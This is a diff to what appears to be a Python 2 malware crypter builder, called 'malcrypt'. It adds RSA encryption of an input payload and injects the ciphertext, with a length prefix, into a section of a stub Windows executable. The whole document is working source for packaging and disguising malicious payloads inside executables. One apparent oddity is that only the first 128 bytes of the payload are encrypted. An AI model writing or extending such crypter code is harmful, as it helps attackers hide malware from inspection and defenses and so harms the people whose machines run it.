@@ -1,11 +1,21 @@
 
 import argparse
 import pefile
+import struct
+
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_v1_5
+from Crypto.Hash import SHA
+
 import SectionDoubleP as secdp
 
-def encrypt_payload(plaintext_data):
-	return plaintext_data
-	pass
+def encrypt_payload(plaintext_data, pubkey_data):
+	pubkey = RSA.importKey(pubkey_data)
+	cipher = PKCS1_v1_5.new(pubkey)
+
+	digest = SHA.new(plaintext_data).digest()
+	ciphertext = cipher.encrypt(plaintext_data + digest)
+	return ciphertext
 
 def inject_payload(stub, payload_data):
 	sections = secdp.SectionDoubleP(stub)
@@ -25,14 +35,21 @@ if __name__ == '__main__':
 	### Open the malcrypt stub.
 	malcrypt_stub = pefile.PE(args.malcrypt)
 
+	with open(args.pubkey, 'rb') as fh:
+		pubkey_data = fh.read()
+	print "Read %d bytes from %s..." % (len(pubkey_data), args.pubkey)
+
 	### Read the input payload, then encrypt
 	with open(args.payload, 'rb') as fh:
 		plaintext_payload_data = fh.read()
 	print "Read %d bytes from %s..." % (len(plaintext_payload_data), args.payload)
-	ciphertext_payload_data = encrypt_payload(plaintext_payload_data)
+
+	### Encrypt payload
+	ciphertext_payload_data = encrypt_payload(plaintext_payload_data[:128], pubkey_data)
+	ciphertext_length = struct.pack("I", len(ciphertext_payload_data))
 
 	### Inject encrypted payload into stub.
-	inject_payload(malcrypt_stub, ciphertext_payload_data)
+	inject_payload(malcrypt_stub, ciphertext_length + ciphertext_payload_data)
 
 	malcrypt_stub.write(filename= args.output)
 	print "Wrote malcrypt with encrypted payload: %s." % args.output
